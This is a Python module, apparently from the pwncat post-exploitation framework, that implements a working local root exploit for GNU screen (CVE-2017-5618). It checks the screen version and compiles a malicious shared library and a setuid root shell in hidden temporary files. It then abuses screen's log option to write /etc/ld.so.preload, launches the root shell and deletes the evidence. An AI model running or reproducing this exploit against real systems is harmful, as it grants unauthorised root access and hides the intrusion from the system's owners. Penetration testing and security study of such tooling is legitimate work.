#!/usr/bin/env python3

from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import socket
import re
from io import StringIO, BytesIO
import functools
import textwrap

from pwncat.util import CTRL_C
from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.file import RemoteBinaryPipe

from pwncat.pysudoers import Sudoers
from pwncat import gtfobins
from pwncat.gtfobins import Capability
from pwncat import util


class ScreenMethod(Method):

    name = "screen (CVE-2017-5618)"
    BINARIES = ["cc", "screen"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(ScreenMethod, self).__init__(pty)
        self.ran_before = False

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        # If we have ran this before, don't bother running it
        if self.ran_before or not (Capability.SHELL & capability):
            return []

        # Carve out the version of screen
        version_output = self.pty.run("screen -v").decode("utf-8").strip()
        match = re.search(r"(\d+\.\d+\.\d+)", version_output)
        if not match:
            raise PrivescError("could not gather screen version")

        # Knowing the version of screen, check if it is vulnerable...
        version_triplet = [int(x) for x in match.group().split(".")]

        if version_triplet[0] > 4:
            raise PrivescError("screen seemingly not vulnerable")

        if version_triplet[0] == 4 and version_triplet[1] > 5:
            raise PrivescError("screen seemingly not vulnerable")

        if (
            version_triplet[0] == 4
            and version_triplet[1] == 5
            and version_triplet[2] >= 1
        ):
            raise PrivescError("screen seemingly not vulnerable")

        # If screen is vulnerable, try the technique!
        techniques = [Technique("root", self, None, Capability.SHELL)]
        return techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        self.ran_before = True

        # Hide the activity by creating hidden temporary files
        libhack_c = (
            self.pty.run("mktemp -t .XXXXXXXXXXX --suffix .c").decode("utf-8").strip()
        )
        libhack_so = (
            self.pty.run("mktemp -t .XXXXXXXXXXX --suffix .so").decode("utf-8").strip()
        )
        rootshell_c = (
            self.pty.run("mktemp -t .XXXXXXXXXXX --suffix .c").decode("utf-8").strip()
        )
        rootshell = self.pty.run("mktemp -t .XXXXXXXXXXX").decode("utf-8").strip()

        # Write the library
        libhack_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                #include <sys/types.h>
                #include <unistd.h>
                __attribute__ ((__constructor__))
                void dropshell(void){{
                    chown("{rootshell}", 0, 0);
                    chmod("{rootshell}", 04755);
                    unlink("/etc/ld.so.preload");
                }}
                """
        ).lstrip()

        with self.pty.open(libhack_c, "w", length=len(libhack_source)) as filp:
            filp.write(libhack_source)

        # Compile the library
        self.pty.run(f"gcc -fPIC -shared -ldl -o {libhack_so} {libhack_c}")

        # Write the rootshell source code
        rootshell_source = textwrap.dedent(
            f"""
                #include <stdio.h>
                int main(void){{
                    setuid(0);
                    setgid(0);
                    seteuid(0);
                    setegid(0);
                    execvp("{self.pty.shell}", NULL, NULL);
                }}
                """
        ).lstrip()

        with self.pty.open(rootshell_c, "w", length=len(rootshell_source)) as filp:
            filp.write(rootshell_source)

        # Compile the rootshell binary
        self.pty.run(f"gcc -o {rootshell} {rootshell_c}")

        # Switch to /etc but save our previous directory so we can return to it
        self.pty.run("pushd /etc")

        # Run screen with our library, saving the umask before changing it
        start_umask = self.pty.run("umask").decode("utf-8").strip()
        self.pty.run("umask 000")
        # sleep(1)
        self.pty.run(f'screen -D -m -L ld.so.preload echo -ne "{libhack_so}"')
        # sleep(1)

        # Trigger the exploit
        self.pty.run("screen -ls")

        # Reset umask to the saved value
        self.pty.run(f"umask {start_umask}")

        # Check if the file is owned by root
        file_owner = self.pty.run(f"stat -c%u {rootshell}").strip()
        if file_owner != b"0":

            raise PrivescError("failed to create root shell")

        # Hop back to the original directory
        self.pty.run("popd")

        # Start the root shell!
        self.pty.process(f"{rootshell}", delim=False)

        # Remove the evidence
        self.pty.run(f"unlink {libhack_so} {libhack_c} {rootshell_c} {rootshell}")
